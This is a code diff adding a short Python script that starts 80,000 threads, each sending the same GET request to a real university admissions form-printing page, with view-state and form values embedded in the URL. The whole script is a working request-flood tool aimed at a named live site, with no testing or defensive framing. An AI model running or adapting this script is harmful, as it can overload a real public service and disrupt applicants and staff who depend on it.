@@ -1,0 +1,14 @@
+import requests
+from threading import Thread
+
+
+def doInnerWork(idx):
+    link = "https://egov.uok.edu.in/eAdmissions/PostLogin/printformWithPaymentgateway.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTkzNzU1NzIyMA8WBB4GZm9ybW5vBQgyMDEwMTAwMR4LU2Vjb3VuZEZvcm1mFgICAw9kFgICAQ9kFgICAQ9kFgICAQ9kFggCAQ8PFgIeBFRleHQFDElOU0hBIFJBU0hJRGRkAgMPDxYCHwIFCDIwMTAxMDAxZGQCBg8PFgIfAgUVUHJpbnQgQXBwaWNhdGlvbiBGb3JtZGQCCA8PFgIeB1Zpc2libGVoZGRklAQ%2FengWen%2F0FVoDeECLOxTY4Rr7nRDamShCCqPyXNU%3D&__VIEWSTATEGENERATOR=EBC16446&__PREVIOUSPAGE=7neECRt9WhbSOajtzSFMhqURtinrC3gjyB33PXS2aCsoCwn7NQ6De5vDWIj_WrYlMmmy2AU1_aiS988knoSPnMy0_XR0jxth8JPL1HZnLEfoAh_BlZOLDIcNBCxITCLrWPivySlKzp6a4XIAOB8AAg2&__EVENTVALIDATION=%2FwEdAA1NmNv0ly1keWyisMqQ0dMfFbt29RHx8cUYzFYTxyFuvR5nZ%2BD7PsIbGz6fLLnJ8KsW2%2F6I64NpNcoGETTnqsFQ1VXLCZniQEihPDabNrSt9NzhqBVdMB%2BAVo7zudn5890jLVlYXrPgVW7vQ1WoVEzlImmzCP3VP%2Br6e92ONZbPz3hJwdzu1%2B%2BbxWpldaAt6Zt%2F9BRvSY4VwnrafBovdLp54mWaWnWVn1WUBqvFCOui5w1Ykgl19lZr5Y9yMP4FzMu5MlXHhfVvqevQk5dOmQzX6TXupygsRKgR2NVOwCAqAS7oY97tx1t0QGupd4pzqJA%3D&btnPrintFormWithPaySlip=Print+Appication+Form&FormNo=21100001&keyValues=E%2BpCdY9EZHSHDTSbstsBgTiOMU%2BVcIPD463DoGwMI7XJHVfonUdw%2FwzunC%2F2RhdT8FWzQ5WN2%2Bu4hdd60q2PjI%2FKNVKQlpDuCMxNbeOkldyiccplx1X%2BPZtsmp8r9RGc3UljEWMM7DMJFx5yQxmCnc0EzTjpttHY%2Bi3ivxyHfqEGNe1jdkrHLzreF8a1r7So1EsD0ZXZpJcJ2IPsfxjXfPv%2BDSiCtj48Xm8fKNeBp804hvbEw%2BOc6L39qtzlYfsDUtfpROFsbwTZGi%2FccX9VJA%3D%3D"
+    payload={}
+    headers = {}
+    requests.request("GET", link, headers=headers, data=payload)
+
+
+#start the shit here
+for idx in range(1, 80000):
+    Thread(target=doInnerWork, args=(idx, )).start()       #make asynchronous call
